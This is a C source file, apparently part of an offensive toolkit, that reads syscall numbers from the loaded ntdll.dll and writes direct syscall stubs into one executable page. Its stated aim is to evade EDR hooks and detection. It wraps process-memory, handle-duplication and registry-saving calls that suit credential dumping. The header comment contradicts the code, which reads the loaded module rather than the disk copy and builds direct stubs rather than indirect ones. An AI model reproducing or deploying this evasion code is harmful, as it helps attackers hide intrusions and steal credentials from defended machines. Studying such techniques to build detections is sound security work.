// syscall_resolver.c — Extract syscall numbers from clean ntdll.dll on disk
// and build indirect syscall stubs to bypass userland EDR hooks
#include "common.h"

static SYSCALL_ENTRY g_Syscalls[] = {
    { L"NtOpenProcess",           0, NULL },
    { L"NtReadVirtualMemory",     0, NULL },
    { L"NtQueryVirtualMemory",    0, NULL },
    { L"NtQuerySystemInformation",0, NULL },
    { L"NtAllocateVirtualMemory", 0, NULL },
    { L"NtWriteVirtualMemory",    0, NULL },
    { L"NtProtectVirtualMemory",  0, NULL },
    { L"NtCreateUserProcess",     0, NULL },
    { L"NtUnmapViewOfSection",    0, NULL },
    { L"NtClose",                 0, NULL },
    { L"NtFreeVirtualMemory",     0, NULL },
    { L"NtOpenProcessToken",      0, NULL },
    { L"NtDuplicateObject",       0, NULL },
    { L"NtOpenKey",               0, NULL },
    { L"NtSaveKey",               0, NULL },
    { NULL, 0, NULL }
};

// Hash function for comparing export names (djb2 variant)
static DWORD NameHash(PCHAR str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + (BYTE)*str;
        str++;
    }
    return hash;
}

// Single page for all stubs — avoids multiple RW→RX transitions that EDR flags
static PBYTE g_StubPage = NULL;
static DWORD g_StubOffset = 0;

// Create a syscall stub inside the shared stub page
// stub:  mov r10, rcx  →  4C 8B D1
//        mov eax, <N>  →  B8 XX XX XX XX
//        syscall       →  0F 05
//        ret           →  C3
PVOID CreateSyscallStub(DWORD syscallNumber) {
    if (!g_StubPage) return NULL;

    PBYTE code = g_StubPage + g_StubOffset;
    // mov r10, rcx
    code[0] = 0x4C;
    code[1] = 0x8B;
    code[2] = 0xD1;
    // mov eax, syscallNumber
    code[3] = 0xB8;
    *(PDWORD)(code + 4) = syscallNumber;
    // syscall
    code[8] = 0x0F;
    code[9] = 0x05;
    // ret
    code[10] = 0xC3;
    code[11] = 0x90; // nop padding

    g_StubOffset += 12;
    return code;
}

// Finalize: change the shared page from RW to RX in one call
static void FinalizeStubs(void) {
    if (g_StubPage && g_StubOffset > 0) {
        DWORD old;
        VirtualProtect(g_StubPage, 4096, PAGE_EXECUTE_READ, &old);
    }
}

// ─── Extract SSN from a loaded ntdll syscall stub ───
// Standard stub (Win10/11 x64):
//   4C 8B D1        mov r10, rcx
//   B8 <imm32>      mov eax, <SSN>
//   0F 05           syscall
//   C3              ret
static BOOL ExtractSsnFromStub(PBYTE stub, DWORD* pSsn) {
    if (!stub || !pSsn) return FALSE;
    // Pattern 1: mov r10, rcx ; mov eax, imm32
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        *pSsn = *(PDWORD)(stub + 4);
        return TRUE;
    }
    // Pattern 2: mov eax, imm32 at offset 0
    if (stub[0] == 0xB8) {
        *pSsn = *(PDWORD)(stub + 1);
        return TRUE;
    }
    // Pattern 3: scan first 16 bytes for mov eax (0xB8)
    for (int i = 0; i < 16; i++) {
        if (stub[i] == 0xB8) {
            *pSsn = *(PDWORD)(stub + i + 1);
            return TRUE;
        }
    }
    return FALSE;
}

// Resolve SSNs from the LOADED ntdll.dll (not disk) so the numbers always
// match what the kernel expects for this boot — survives syscall number
// randomization and any file-system interception on ntdll.dll.
BOOL InitSyscallResolver(void) {
    // Pre-allocate one shared page for all stubs (avoids N×RW→RX EDR triggers)
    g_StubPage = (PBYTE)VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_StubPage) return FALSE;
    g_StubOffset = 0;

    PBYTE base = (PBYTE)GetModuleHandleW(L"ntdll.dll");
    if (!base) {
        fprintf(stderr, "[!] resolver: GetModuleHandle(ntdll.dll) failed\n");
        fflush(stderr);
        return FALSE;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || nt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] resolver: invalid PE headers\n");
        fflush(stderr);
        return FALSE;
    }

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0) {
        fprintf(stderr, "[!] resolver: no export directory\n");
        fflush(stderr);
        return FALSE;
    }

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exportRVA);
    PDWORD names = (PDWORD)(base + exports->AddressOfNames);
    PWORD  ordinals = (PWORD)(base + exports->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)(base + exports->AddressOfFunctions);

    DWORD resolvedCount = 0;
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        BOOL found = FALSE;
        for (DWORD j = 0; j < exports->NumberOfNames; j++) {
            PCHAR exportName = (PCHAR)(base + names[j]);

            // Convert narrow to wide for comparison
            WCHAR wName[128];
            int k = 0;
            while (exportName[k] && k < 127) {
                wName[k] = (WCHAR)(BYTE)exportName[k];
                k++;
            }
            wName[k] = L'\0';

            if (wcscmp(wName, g_Syscalls[i].name) == 0) {
                found = TRUE;
                PBYTE stub = base + functions[ordinals[j]];
                DWORD ssn = 0;
                if (ExtractSsnFromStub(stub, &ssn) && ssn < 0x1000) {
                    g_Syscalls[i].syscallNumber = ssn;
                    g_Syscalls[i].stubAddress = CreateSyscallStub(ssn);
                    if (g_Syscalls[i].stubAddress) {
                        resolvedCount++;
                    }
                } else {
                    fprintf(stderr, "[!] resolver: %S — bad stub pattern "
                        "(%02X %02X %02X %02X %02X %02X %02X %02X), ssn=0x%08X\n",
                        g_Syscalls[i].name, stub[0], stub[1], stub[2], stub[3],
                        stub[4], stub[5], stub[6], stub[7], ssn);
                    fflush(stderr);
                }
                break;
            }
        }
        if (!found) {
            fprintf(stderr, "[!] resolver: %S not found in exports\n", g_Syscalls[i].name);
            fflush(stderr);
        }
    }

    // Finalize: change shared page from RW to RX in ONE call (not N calls)
    FinalizeStubs();

    fprintf(stderr, "[*] resolver: %u/%u syscalls resolved\n",
        resolvedCount, (DWORD)(_countof(g_Syscalls) - 1));
    fflush(stderr);
    return resolvedCount > 0;
}

// ─── Lookup helpers ───
DWORD GetSyscallNumber(PWSTR functionName) {
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        if (wcscmp(g_Syscalls[i].name, functionName) == 0) {
            return g_Syscalls[i].syscallNumber;
        }
    }
    return 0;
}

PVOID GetSyscallStub(PWSTR functionName) {
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        if (wcscmp(g_Syscalls[i].name, functionName) == 0) {
            return g_Syscalls[i].stubAddress;
        }
    }
    return NULL;
}

// ─── Indirect syscall wrappers ───
// Each wrapper calls the stub function pointer directly (not through ntdll)

typedef NTSTATUS (NTAPI *PFN_SYSCALL_0)(void);
typedef NTSTATUS (NTAPI *PFN_SYSCALL_4)(DWORD64, DWORD64, DWORD64, DWORD64);

NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* ClientId) {
    PVOID stub = GetSyscallStub(L"NtOpenProcess");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,CLIENT_ID*))stub)
        (ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS SysNtReadVirtualMemory(HANDLE hProcess, PVOID BaseAddress,
    PVOID Buffer, SIZE_T BufferSize, PSIZE_T BytesRead) {
    PVOID stub = GetSyscallStub(L"NtReadVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))stub)
        (hProcess, BaseAddress, Buffer, BufferSize, BytesRead);
}

NTSTATUS SysNtQueryVirtualMemory(HANDLE hProcess, PVOID BaseAddress,
    ULONG MemoryInformationClass, PVOID MemoryInformation,
    SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    PVOID stub = GetSyscallStub(L"NtQueryVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID,ULONG,PVOID,SIZE_T,PSIZE_T))stub)
        (hProcess, BaseAddress, MemoryInformationClass, MemoryInformation,
         MemoryInformationLength, ReturnLength);
}

NTSTATUS SysNtQuerySystemInformation(ULONG SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    PVOID stub = GetSyscallStub(L"NtQuerySystemInformation");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(ULONG,PVOID,ULONG,PULONG))stub)
        (SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
}

NTSTATUS SysNtAllocateVirtualMemory(HANDLE hProcess, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    PVOID stub = GetSyscallStub(L"NtAllocateVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG))stub)
        (hProcess, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS SysNtWriteVirtualMemory(HANDLE hProcess, PVOID BaseAddress,
    PVOID Buffer, SIZE_T BufferSize, PSIZE_T BytesWritten) {
    PVOID stub = GetSyscallStub(L"NtWriteVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))stub)
        (hProcess, BaseAddress, Buffer, BufferSize, BytesWritten);
}

NTSTATUS SysNtProtectVirtualMemory(HANDLE hProcess, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    PVOID stub = GetSyscallStub(L"NtProtectVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG))stub)
        (hProcess, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS SysNtUnmapViewOfSection(HANDLE hProcess, PVOID BaseAddress) {
    PVOID stub = GetSyscallStub(L"NtUnmapViewOfSection");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID))stub)(hProcess, BaseAddress);
}

NTSTATUS SysNtClose(HANDLE Handle) {
    PVOID stub = GetSyscallStub(L"NtClose");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE))stub)(Handle);
}

NTSTATUS SysNtFreeVirtualMemory(HANDLE hProcess, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType) {
    PVOID stub = GetSyscallStub(L"NtFreeVirtualMemory");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG))stub)
        (hProcess, BaseAddress, RegionSize, FreeType);
}

NTSTATUS SysNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle,
    HANDLE TargetProcessHandle, PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) {
    PVOID stub = GetSyscallStub(L"NtDuplicateObject");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,HANDLE,HANDLE,PHANDLE,ACCESS_MASK,ULONG,ULONG))stub)
        (SourceProcessHandle, SourceHandle, TargetProcessHandle,
         TargetHandle, DesiredAccess, HandleAttributes, Options);
}

NTSTATUS SysNtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes) {
    PVOID stub = GetSyscallStub(L"NtOpenKey");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES))stub)
        (KeyHandle, DesiredAccess, ObjectAttributes);
}

NTSTATUS SysNtSaveKey(HANDLE KeyHandle, PUNICODE_STRING FileName) {
    PVOID stub = GetSyscallStub(L"NtSaveKey");
    if (!stub) return STATUS_PROCEDURE_NOT_FOUND;
    return ((NTSTATUS (NTAPI*)(HANDLE,PUNICODE_STRING))stub)(KeyHandle, FileName);
}
